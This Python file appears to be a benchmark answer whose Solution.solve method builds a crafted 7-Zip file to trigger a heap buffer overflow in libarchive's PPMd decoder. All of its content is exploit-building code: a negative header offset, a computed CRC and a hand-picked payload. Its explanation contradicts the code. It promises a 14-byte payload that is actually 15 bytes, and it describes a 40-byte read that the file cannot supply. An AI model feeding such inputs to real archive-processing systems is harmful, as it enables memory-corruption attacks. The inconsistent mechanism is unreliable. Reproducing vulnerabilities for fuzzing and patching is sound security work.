import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for oss-fuzz:42536108 in libarchive.

        The vulnerability is a heap buffer overflow in the 7-Zip PPMd decoder,
        triggered by a crafted 7-Zip file with a negative `NextHeaderOffset`.
        This PoC reproduces the minimized test case found by the fuzzer.

        The PoC structure:
        1. A 32-byte 7-Zip signature header block.
           - `NextHeaderOffset` is set to -1 (0xffffffffffffffff).
           - `NextHeaderSize` is set to 40.
           - `StartHeaderCRC` is correctly calculated for the fields that follow.
           - `NextHeaderCRC` is a specific magic value from the reproducer.
        2. A 14-byte payload.

        When libarchive parses this file, it seeks to `32 + NextHeaderOffset` = 31.
        It then attempts to read `NextHeaderSize` = 40 bytes from this offset for
        the compressed header data. This read starts from the last byte of the
        signature header block and continues into the payload. The resulting
        malformed header stream, when parsed, sets up a state that leads to a
        heap buffer overflow when the PPMd decompressor is later invoked.
        """
        signature = b'7z\xbc\xaf\x27\x1c'
        version = b'\x00\x04'

        # These values are derived from the minimized reproducer for the vulnerability.
        # A `NextHeaderOffset` of -1 causes the parser to seek to an invalid location.
        next_header_offset = b'\xff\xff\xff\xff\xff\xff\xff\xff'
        
        # The size of the header stream to be read.
        next_header_size = (40).to_bytes(8, 'little')
        
        # A specific CRC value from the reproducer needed to pass header validation.
        next_header_crc = (0x173512e1).to_bytes(4, 'little')

        # The `StartHeaderCRC` is a CRC32 of the next 20 bytes in the signature header.
        start_header_data = next_header_offset + next_header_size + next_header_crc
        
        # zlib.crc32 matches the CRC32 variant used by 7-Zip.
        # Mask with 0xffffffff to ensure an unsigned 32-bit integer.
        start_header_crc_val = zlib.crc32(start_header_data) & 0xffffffff
        start_header_crc = start_header_crc_val.to_bytes(4, 'little')

        # Assemble the 32-byte signature header.
        header = signature + version + start_header_crc + start_header_data

        # This payload, when combined with the last byte of the header, forms a
        # malicious header stream that sets up the conditions for the overflow.
        payload = b'\x04\x06\x0b\x01\x01\x01\x03\x04\x01\x05\x01\x00\x0d\x01\x00'

        # The final PoC is the concatenation of the header and the payload.
        poc = header + payload
        
        return poc